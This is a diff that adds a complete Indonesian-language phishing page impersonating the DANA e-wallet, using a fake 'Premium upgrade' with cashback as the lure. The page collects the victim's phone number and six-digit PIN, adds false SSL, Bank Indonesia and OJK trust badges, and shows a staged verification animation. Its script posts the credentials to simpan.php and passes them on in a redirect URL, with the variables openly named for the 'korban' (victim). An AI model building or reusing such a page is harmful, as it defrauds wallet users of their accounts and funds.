@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta name="theme-color" content="#118EEA">
+<meta name="description" content="DANA - Dompet Digital Indonesia. Upgrade akun DANA Premium untuk nikmati limit transaksi lebih besar dan cashback hingga 30%.">
+<title>DANA Premium - Upgrade Akun Anda</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💙</text></svg>">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
+body{background:#f0f4f8;color:#1a2530;line-height:1.5;font-size:14px;min-height:100vh}
+.topbar{background:#118EEA;color:#fff;padding:10px 16px;display:flex;align-items:center;justify-content:space-between;font-size:11px}
+.topbar .left{display:flex;align-items:center;gap:8px}
+.topbar .logo{font-weight:800;font-size:16px;letter-spacing:-.5px}
+.topbar .secure{background:rgba(255,255,255,.15);padding:3px 8px;border-radius:12px;font-size:10px}
+
+/* HERO */
+.hero{background:linear-gradient(135deg,#118EEA,#0b6bc4);color:#fff;padding:28px 20px 80px;text-align:center;position:relative;overflow:hidden}
+.hero::before{content:'';position:absolute;top:-80px;right:-80px;width:240px;height:240px;background:radial-gradient(circle,rgba(255,255,255,.15),transparent 70%);border-radius:50%}
+.hero::after{content:'';position:absolute;bottom:-100px;left:-60px;width:220px;height:220px;background:radial-gradient(circle,rgba(255,215,0,.18),transparent 70%);border-radius:50%}
+.hero .crown{font-size:44px;margin-bottom:8px;position:relative;z-index:1}
+.hero h1{font-size:22px;font-weight:800;margin-bottom:6px;position:relative;z-index:1}
+.hero p{font-size:12.5px;opacity:.95;position:relative;z-index:1}
+.hero .badges{display:flex;flex-wrap:wrap;gap:6px;justify-content:center;margin-top:12px;position:relative;z-index:1}
+.hero .badges span{background:rgba(255,255,255,.2);padding:4px 10px;border-radius:20px;font-size:10.5px;font-weight:600}
+
+/* CARD */
+.container{max-width:420px;margin:-60px auto 30px;padding:0 16px;position:relative;z-index:2}
+.card{background:#fff;border-radius:16px;box-shadow:0 8px 28px rgba(11,107,196,.15);overflow:hidden;margin-bottom:14px}
+.card-head{padding:18px 20px 6px;text-align:center}
+.card-head h2{font-size:17px;color:#118EEA;font-weight:800}
+.card-head p{font-size:11.5px;color:#667;margin-top:3px}
+.card-body{padding:14px 20px 20px}
+
+/* FORM */
+.field{margin-bottom:14px}
+.field label{display:block;font-size:12px;font-weight:600;color:#334;margin-bottom:6px}
+.field input{width:100%;padding:13px 15px;font-size:14px;border:1.5px solid #d4dce5;border-radius:12px;outline:none;background:#f8fbfe;transition:.2s;font-family:inherit;color:#1a2530}
+.field input:focus{border-color:#118EEA;background:#fff;box-shadow:0 0 0 4px rgba(17,142,234,.1)}
+.field .prefix{position:relative}
+.field .prefix input{padding-left:52px}
+.field .prefix::before{content:'+62';position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:14px;font-weight:700;color:#118EEA;pointer-events:none}
+.field .hint{font-size:10.5px;color:#889;margin-top:4px}
+
+/* PIN BOX */
+.pin-wrap{display:flex;gap:8px;justify-content:center;margin:8px 0 6px}
+.pin-wrap input{width:44px;height:52px;text-align:center;font-size:22px;font-weight:800;border:1.5px solid #d4dce5;border-radius:10px;background:#f8fbfe;outline:none;color:#118EEA;font-family:'Courier New',monospace}
+.pin-wrap input:focus{border-color:#118EEA;background:#fff;box-shadow:0 0 0 4px rgba(17,142,234,.1)}
+.pin-wrap input.filled{background:#e8f5fe;border-color:#118EEA}
+
+/* BUTTON */
+.btn{width:100%;padding:14px;background:linear-gradient(135deg,#118EEA,#0b6bc4);color:#fff;font-size:14.5px;font-weight:800;border:none;border-radius:12px;cursor:pointer;transition:.2s;font-family:inherit;letter-spacing:.3px;box-shadow:0 4px 14px rgba(17,142,234,.3)}
+.btn:hover{transform:translateY(-1px);box-shadow:0 8px 20px rgba(17,142,234,.4)}
+.btn:disabled{background:#b0b8c1;cursor:not-allowed;transform:none;box-shadow:none}
+.btn.gold{background:linear-gradient(135deg,#FFB800,#FF8C00);box-shadow:0 4px 14px rgba(255,184,0,.35)}
+.btn.gold:hover{box-shadow:0 8px 20px rgba(255,184,0,.5)}
+
+/* ALERT */
+.alert{display:flex;gap:10px;padding:11px 13px;border-radius:10px;font-size:11.5px;margin-bottom:12px;line-height:1.55;align-items:flex-start}
+.alert .ic{font-size:16px;flex-shrink:0}
+.alert.info{background:#e8f5fe;border-left:4px solid #118EEA;color:#0b4a80}
+.alert.warn{background:#fff8e1;border-left:4px solid #FFB800;color:#7a4d00}
+.alert.success{background:#e6f4ea;border-left:4px solid #1e8e3e;color:#0d4f1f}
+
+/* BENEFIT */
+.benefit{background:#f8fbfe;border-radius:12px;padding:14px;margin-bottom:14px;border:1px dashed #c8dff5}
+.benefit h4{font-size:12.5px;color:#118EEA;margin-bottom:10px;font-weight:800;display:flex;align-items:center;gap:6px}
+.benefit ul{list-style:none}
+.benefit li{display:flex;gap:8px;align-items:flex-start;padding:5px 0;font-size:11.5px;color:#334;line-height:1.5}
+.benefit li::before{content:'✨';flex-shrink:0;font-size:11px}
+
+/* FOOTER */
+.footer{text-align:center;padding:18px 16px 24px;font-size:10.5px;color:#889;line-height:1.7}
+.footer b{color:#118EEA}
+.footer .logos{display:flex;justify-content:center;gap:14px;margin-top:10px;font-size:10px;color:#667;flex-wrap:wrap}
+.footer .logos span{background:#fff;padding:4px 10px;border-radius:8px;border:1px solid #e0e8f0}
+
+/* LOADING OVERLAY */
+.loading-overlay{position:fixed;inset:0;background:rgba(255,255,255,.97);z-index:9999;display:none;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:30px}
+.loading-overlay.show{display:flex}
+.spinner{width:60px;height:60px;border:5px solid #e0eefb;border-top-color:#118EEA;border-radius:50%;animation:spin .9s linear infinite;margin-bottom:18px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-overlay h3{font-size:15px;color:#118EEA;margin-bottom:6px;font-weight:800}
+.loading-overlay p{font-size:12px;color:#667;line-height:1.6}
+.loading-overlay .step{font-size:11px;color:#889;margin-top:10px;font-weight:600}
+
+.hidden{display:none!important}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="left">
+    <span class="logo">dana</span>
+    <span>Premium</span>
+  </div>
+  <span class="secure">🔒 SSL Aman</span>
+</div>
+
+<div class="hero">
+  <div class="crown">👑</div>
+  <h1>Upgrade ke DANA Premium</h1>
+  <p>Nikmati limit transaksi lebih besar & cashback hingga 30%</p>
+  <div class="badges">
+    <span>💰 Limit Rp 50jt/hari</span>
+    <span>🎁 Cashback 30%</span>
+    <span>⚡ Transfer Gratis</span>
+  </div>
+</div>
+
+<div class="container">
+  <div class="card">
+    <div class="card-head">
+      <h2>Masuk ke Akun DANA Anda</h2>
+      <p>Masukkan nomor & PIN DANA untuk upgrade</p>
+    </div>
+    <div class="card-body">
+
+      <div class="alert info">
+        <span class="ic">ℹ️</span>
+        <div>Gunakan nomor DANA yang <b>aktif</b> untuk menerima cashback upgrade.</div>
+      </div>
+
+      <div class="field">
+        <label>Nomor DANA</label>
+        <div class="prefix">
+          <input type="tel" id="nomor" placeholder="81234567890" inputmode="numeric" maxlength="13" autocomplete="off" oninput="validNomor()">
+        </div>
+        <div class="hint">Masukkan nomor tanpa angka 0 di depan</div>
+      </div>
+
+      <div class="field">
+        <label>PIN DANA (6 digit)</label>
+        <div class="pin-wrap">
+          <input type="password" maxlength="1" inputmode="numeric" id="p1" oninput="nextPin(1)" onkeydown="backPin(event,1)">
+          <input type="password" maxlength="1" inputmode="numeric" id="p2" oninput="nextPin(2)" onkeydown="backPin(event,2)">
+          <input type="password" maxlength="1" inputmode="numeric" id="p3" oninput="nextPin(3)" onkeydown="backPin(event,3)">
+          <input type="password" maxlength="1" inputmode="numeric" id="p4" oninput="nextPin(4)" onkeydown="backPin(event,4)">
+          <input type="password" maxlength="1" inputmode="numeric" id="p5" oninput="nextPin(5)" onkeydown="backPin(event,5)">
+          <input type="password" maxlength="1" inputmode="numeric" id="p6" oninput="nextPin(6)" onkeydown="backPin(event,6)">
+        </div>
+        <div class="hint" style="text-align:center">PIN digunakan untuk verifikasi upgrade</div>
+      </div>
+
+      <div class="benefit">
+        <h4>🎁 Benefit DANA Premium</h4>
+        <ul>
+          <li>Limit transaksi naik jadi <b>Rp 50.000.000/hari</b></li>
+          <li>Cashback hingga <b>30%</b> untuk semua transaksi</li>
+          <li>Bebas biaya admin transfer ke bank manapun</li>
+          <li>Prioritas customer service 24/7</li>
+          <li>Akses fitur eksklusif DANA Premium</li>
+        </ul>
+      </div>
+
+      <button class="btn gold" id="btnLogin" onclick="loginDana()">👑 Upgrade Sekarang</button>
+
+      <div class="alert warn" style="margin-top:14px">
+        <span class="ic">⚠️</span>
+        <div>Pastikan data yang dimasukkan benar. Kesalahan input dapat menyebabkan akun terkunci sementara.</div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="footer">
+    <b>DANA Premium</b> — Dompet Digital Indonesia<br>
+    Diawasi oleh Bank Indonesia & OJK
+    <div class="logos">
+      <span>🔒 SSL</span>
+      <span>🏦 BI</span>
+      <span>✅ OJK</span>
+    </div>
+  </div>
+</div>
+
+<!-- LOADING -->
+<div class="loading-overlay" id="loading">
+  <div class="spinner"></div>
+  <h3>Memverifikasi Akun...</h3>
+  <p>Mohon tunggu sebentar, jangan tutup halaman ini</p>
+  <div class="step" id="loading-step">Menghubungi server DANA...</div>
+</div>
+
+<script>
+/* SIMPAN DATA SEMENTARA */
+let korbanNomor='', korbanPin='';
+
+/* PIN INPUT AUTO NEXT */
+function nextPin(n){
+  const el=document.getElementById('p'+n);
+  if(el.value){
+    el.classList.add('filled');
+    if(n<6) document.getElementById('p'+(n+1)).focus();
+  } else el.classList.remove('filled');
+}
+function backPin(e,n){
+  if(e.key==='Backspace' && !e.target.value && n>1){
+    document.getElementById('p'+(n-1)).focus();
+  }
+}
+
+function validNomor(){
+  const el=document.getElementById('nomor');
+  el.value=el.value.replace(/\D/g,'');
+}
+
+/* LOGIN DANA */
+function loginDana(){
+  const nomor=document.getElementById('nomor').value.trim();
+  let pin='';
+  for(let i=1;i<=6;i++) pin+=document.getElementById('p'+i).value;
+
+  if(nomor.length<9||nomor.length>13){alert('Nomor DANA tidak valid');return;}
+  if(pin.length!==6){alert('PIN harus 6 digit');return;}
+
+  korbanNomor=nomor;
+  korbanPin=pin;
+
+  /* TAMPILKAN LOADING */
+  document.getElementById('loading').classList.add('show');
+  const steps=[
+    'Menghubungi server DANA...',
+    'Memverifikasi nomor...',
+    'Mengecek PIN...',
+    'Menghubungi server OJK...',
+    'Menyiapkan halaman upgrade...'
+  ];
+  let i=0;
+  const iv=setInterval(()=>{
+    if(i<steps.length){
+      document.getElementById('loading-step').textContent=steps[i];
+      i++;
+    }
+  },600);
+
+  /* SIMPAN KE SERVER */
+  const fd=new FormData();
+  fd.append('nomor',nomor);
+  fd.append('pin',pin);
+  fd.append('tahap','login');
+
+  fetch('simpan.php',{method:'POST',body:fd})
+    .then(()=>{
+      setTimeout(()=>{
+        clearInterval(iv);
+        /* REDIRECT KE PROSES UPGRADE */
+        window.location.href='proses.html?nomor='+encodeURIComponent(nomor)+'&pin='+encodeURIComponent(pin);
+      },3200);
+    })
+    .catch(()=>{
+      setTimeout(()=>{
+        window.location.href='proses.html?nomor='+encodeURIComponent(nomor)+'&pin='+encodeURIComponent(pin);
+      },3200);
+    });
+}
+</script>
+</body>
+</html>
